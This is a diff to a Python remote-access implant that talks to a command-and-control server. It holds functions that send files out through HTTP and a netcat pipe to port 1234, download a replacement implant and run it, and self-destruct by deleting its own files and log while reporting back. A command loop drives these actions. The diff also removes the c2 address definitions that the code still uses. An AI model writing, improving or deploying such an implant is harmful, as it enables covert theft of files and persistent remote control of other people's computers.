@@ -6,25 +6,24 @@ import subprocess
 import sys
 
 #Comms
-c2 = 'http://localhost:443'
-c2IPAdress = 'localhost'
-cwd = os.getcwd()
+implantDir = os.getcwd()
+cwd = implantDir
 
 #This will upload a file to the target server.
 def ExfilFile(file, c2, IPAddress):
     urllib.request.urlopen(f'{c2}/exfil?sid={sid}&file={file}')
-    os.system(f'nc {IPAddress} 1234 < {file}')
+    os.system(f'nc -q0 -w5 {IPAddress} 1234 < {file}')
     return
 
 #This will download the new version of the implant, and then run it as a subprocess.
-def UpdateImplant():
-    urllib.request.urlretrieve(f'{c2}/updateImplant?sid={sid}', "implant.py")
+def UpdateImplant(implantDir):
+    urllib.request.urlretrieve(f'{c2}/updateImplant?sid={sid}', f'{implantDir}/implant.py')
     subprocess.Popen([sys.executable, "implant.py"])
     return
 
 #This will self destruct our implant.
-def SelfDestruct():
-    os.system('rm sid.log; rm implant.py')
+def SelfDestruct(implantDir):
+    os.system(f'rm {implantDir}/sid.log; rm {implantDir}/implant.py')
     destructMsg = urllib.parse.quote_plus("Implant has self destructed")
     urllib.request.urlopen(f'{c2}/info?info={destructMsg}&sid={sid}')
     return
@@ -35,7 +34,7 @@ def MakePath(dir):
     tempCWD = cwd
     for dir in path:
         if dir == '..':
-            tempCWD = tempCWD.rsplit('\\',1)[0]
+            tempCWD = tempCWD.rsplit('/',1)[0]
         else:
             tempCWD = f'{tempCWD}/{dir}'
     return tempCWD
@@ -90,11 +89,12 @@ while True:
         elif next[0] == 'cd':
             cwd = ChangeDir(cwd, next[1])
         elif next[0] == 'update':
-            UpdateImplant()
+            UpdateImplant(implantDir)
         elif next[0] == 'exfil':
             ExfilFile(next[1], c2, c2IPAdress)
         elif next[0] == 'selfdestruct':
-            SelfDestruct()
+            SelfDestruct(implantDir)
+            break
         else:
             time.sleep(10)
         time.sleep(5)
